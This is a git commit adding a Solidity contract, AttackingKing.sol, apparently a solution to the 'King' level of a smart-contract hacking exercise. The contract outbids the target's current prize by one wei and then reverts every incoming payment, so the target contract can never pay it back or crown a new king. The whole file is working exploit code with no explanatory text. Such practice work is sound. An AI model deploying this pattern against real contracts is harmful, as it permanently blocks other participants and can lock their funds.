e5f71e4c9831ab18c0464cf258abeaa41f5f9c3d
Laurence Davies <ljd.davies@gmail.com>
2022-08-18 08:09:36 +0200

    Hack king contract

---
+++ contracts/5.King/AttackingKing.sol
@@ -0,0 +1,32 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.9;
+import "./King.sol";
+import "hardhat/console.sol";
+
+contract AttackingKing {
+    address public contractAddress;
+
+    constructor(address _contractAddress) payable {
+        contractAddress = _contractAddress;
+    }
+
+    function hackContract() external {
+        uint256 currentPrizeAmount = currentPrize();
+        (bool success, ) = contractAddress.call{value: currentPrizeAmount + 1}(
+            ""
+        );
+        require(success, "send failed");
+    }
+
+    function currentPrize() internal view returns (uint256 prize) {
+        (bool success, bytes memory _prize) = contractAddress.staticcall(
+            abi.encodeWithSelector(bytes4(keccak256("_prize()")))
+        );
+        require(success, "Failed to get current prize");
+        prize = abi.decode(_prize, (uint256));
+    }
+
+    receive() external payable {
+        revert("hacked");
+    }
+}
